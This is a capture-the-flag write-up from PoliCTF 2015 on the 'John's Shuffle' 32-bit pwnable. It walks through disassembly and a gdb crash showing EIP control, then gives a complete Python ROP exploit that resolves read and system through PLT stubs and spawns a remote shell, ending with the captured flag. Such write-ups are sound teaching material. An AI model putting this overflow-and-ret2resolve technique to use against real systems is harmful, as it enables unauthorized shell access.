---
layout: post
title: "PoliCTF 2015 John's Shuffle"
date: 2015-07-12 17:22:29 -0400
author: [barrebas]
comments: true
categories: [polictf]
---

### Solved by barrebas

John's Shuffle was a 350 point pwnable for PoliCTF 2015. Here's how I cracked it!

<!--more-->

Again, it's a 32 bit ELF binary. Running it yields the following:

```bash
bas@tritonal:~/tmp/polictf/johns-shuffle$ ./johns-shuffle 
It all began as a mistake..


It all began as a mistake..


It all began as a mistake..
```

Not very useful. The disassembly provided some hints, for it had functions like `shuffle`, `unshuffle` and `bubblesort`. The program kicks off by clearing a lot of stack space and calling `unshuffle`. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * `A` (what else?). 

```
    ... clear stack space ...
 8048f30: call   8048df0 <unshuffle>
 8048f35: mov    DWORD PTR [esp],0x804b078
 8048f3c: call   8048710 <puts@plt>
 8048f41: mov    eax,ds:0x804b0c0
 8048f46: mov    DWORD PTR [esp],eax
 8048f49: call   80486c0 <fflush@plt>
 8048f4e: mov    eax,ds:0x804b0a0
 8048f53: mov    DWORD PTR [esp+0x8],eax
 8048f57: mov    DWORD PTR [esp+0x4],0x44
 8048f5f: lea    eax,[esp+0x2c]
 8048f63: mov    DWORD PTR [esp],eax
 8048f66: call   80486e0 <fgets@plt>
```

When runnning the `shuffle` function, the program executes `system()`, which spawns `/bin/dash` on my system, effectively stopping me from debugging it in `gdb`. I patched system in gdb so it would return immediately and I could trace the program. Turns out `shuffle` takes the GOT entries, all the function pointers, and shuffles them around. `unshuffle` negates this operation. After the second time I entered 0x44 A's, the program crashed with control over EIP and EBP:

```
gdb-peda$ start
Temporary breakpoint 2, 0x08048ec2 in main ()
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e9ac30 <system>
gdb-peda$ set *0xf7e9ac30=0xc3
gdb-peda$ c
It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

It all began as a mistake..

It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fbeff4 --> 0x15fd7c 
ECX: 0x4 
EDX: 0x80487a6 (<difftime@plt+6>:   push   0x88)
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5c0 ('A' <repeats 31 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c0 ('A' <repeats 31 times>)
0004| 0xffffd5c4 ('A' <repeats 27 times>)
0008| 0xffffd5c8 ('A' <repeats 23 times>)
0012| 0xffffd5cc ('A' <repeats 19 times>)
0016| 0xffffd5d0 ('A' <repeats 15 times>)
0020| 0xffffd5d4 ('A' <repeats 11 times>)
0024| 0xffffd5d8 ("AAAAAAA")
0028| 0xffffd5dc --> 0x414141 ('AAA')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```

Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can't just ret2system. I spent some time trying to return to `unshuffle`, but kept losing control of the program execution. 

But let's take a step back here. Linux ELF binaries employ something called "lazy linking". When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):

```
080486d0 <memcpy@plt>:
 80486d0:   ff 25 1c b0 04 08       jmp    DWORD PTR ds:0x804b01c 
 80486d6:   68 20 00 00 00          push   0x20
 80486db:   e9 a0 ff ff ff          jmp    8048680 <_init+0x2c>
```

When called for the first time, `0x804b01c` will be pointing to `0x80486d6`, which will kick off the function resolver. So instead of using `0x80486d0` to do a memcpy, I'd just use `0x80486d6`. This bypasses the mess that `shuffle` made!

With all this in hand, I wrote an exploit and the corresponding rop chain (well... more like ret2resolve ;)).

```python
from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('shuffle.polictf.it', 80))

    readtil('mistake..')
    
    rop = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    rop += p(0x8048696) # resolve -> read (so we can read in `/bin/sh`)
    rop += p(0x804901d) # pppr
    rop += p(0)         # stdin
    rop += p(0x804b130) # free mem area
    rop += p(0x10)
    rop += p(0x8048726) # resolve -> system
    rop += p(0x8048746) # resolve -> exit (makes rasta_mouse happy!)
    rop += p(0x804b130) # arg for system; will contain /bin/sh in a few moments
    
    sendln(rop)
    
    readtil('mistake..')
    sendln(rop)
    readtil('mistake..')
    sendln(rop)
    
    sendln('/bin/sh')
    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
```

```bash
bas@tritonal:~/tmp/polictf/johns-shuffle$ python poc.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cat /home/ctf/*
flag{rand0mizing_things_with_l0ve}
cat: /home/ctf/johnshuffle: Permission denied
```

Easy peasy! The flag was `flag{rand0mizing_things_with_l0ve}`. Nice!

